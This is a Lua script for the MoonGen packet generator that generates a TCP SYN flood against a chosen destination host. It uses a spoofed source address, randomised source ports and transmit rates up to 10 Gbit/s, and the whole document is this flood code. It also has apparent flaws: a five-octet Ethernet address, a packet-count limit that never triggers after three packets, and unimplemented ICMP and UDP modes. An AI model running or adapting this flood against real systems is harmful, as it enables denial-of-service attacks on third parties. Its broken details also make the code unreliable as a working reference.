local mg		= require "moongen"
local memory	= require "memory"
local device	= require "device"
local stats		= require "stats"
local log 		= require "log"

function configure(parser)
	parser:description("Generates TCP SYN flood from varying source IPs, supports both IPv4 and IPv6")
	parser:argument("host", "Destination IP (IPv4 or IPv6).")
	parser:option("-I --interface", "interface name"):default(0):convert(tonumber)
	parser:option("-r --rate", "Transmit rate in Mbit/s."):default(10000):convert(tonumber)
	parser:option("-c --count", "Packet count"):default(10000):convert(tonumber)
	parser:option("-a --spoof", "Spoof source address (IPv4 or IPv6)."):default("10.0.0.1")
	parser:option("-s --baseport", "TCP/UDP source port (default random)"):default(-1):convert(tonumber)
	parser:option("-p --destport", "TCP/UDP destination port"):default(80):convert(tonumber)
	parser:flag("-1 --icmp", "ICMP mode")
	parser:flag("-2 --udp", "UDP mode")
end

function master(args)
	local dev = device.config{port = args.interface}
	local conf = {}
	conf.count = args.count

	dev:wait()
	dev:getTxQueue(0):setRate(args.rate)

	if args.icmp then
	  print ("ICMP mode on")
		conf.proto = 1
	elseif args.udp then
		print ("UDP mode on")
		conf.proto = 17
	else
		print ("TCP mode on")
		conf.proto = 6
	end

	mg.startTask("loadSlave", dev:getTxQueue(0), conf, args.spoof, args.host, args.baseport, args.destport)
	mg.waitForTasks()
end

function loadSlave(queue, conf, minA, dest, baseport,  destport)
	--- parse and check ip addresses
	local minIP, ipv4 = parseIPAddress(minA)
	if minIP then
		log:info("Detected an %s address.", minIP and "IPv4" or "IPv6")
	else
		log:fatal("Invalid minIP: %s", minA)
	end
	log:info("Proto %s ", conf.proto)

	if conf.proto == 1 then
	  print ("ICMP mode get ICMP packet, not implemented yet")
		do return end
  elseif conf.proto == 17 then
		print ("UDP mode get UDP packet, not implemented yet")
		do return end
  else
		print ("TCP mode get TCP packet")
	-- min TCP packet size for IPv6 is 74 bytes (+ CRC)
	local packetLen = ipv4 and 60 or 74

	-- continue normally
  local mem = memory.createMemPool(function(buf)
		buf:getTcpPacket(ipv4):fill{
			ethSrc = queue,
			ethDst = "12:34:56:78:90",
			ip4Dst = dest,
			ip6Dst = dest,
			tcpSyn = 1,
			tcpSrc = baseport,
			tcpDst = destport,
			tcpSeqNumber = 1,
			tcpWindow = 10,
			pktLength = packetLen
		}
	end)

	local bufs = mem:bufArray(128)
	local c = 0

	local txStats = stats:newDevTxCounter(queue, "plain")
	while mg.running() do
		-- fill packets and set their size
		bufs:alloc(packetLen)
		for i, buf in ipairs(bufs) do
			local pkt = buf:getTcpPacket(ipv4)
			if ipv4 then
				pkt.ip4.src:set(minIP)
			else
				pkt.ip6.src:set(minIP)
			end
			if baseport < 0 then
				pkt.tcp:setSrc(math.random(65535))
			end
			-- dump first packets
			if c < 3 then
				buf:dump()
				c = c + 1
			end
			if c == conf.count then
				do return end
			end
		end

		--offload checksums to NIC
		bufs:offloadTcpChecksums(ipv4)

		queue:send(bufs)
		txStats:update()
		end
		txStats:finalize()
	end
end
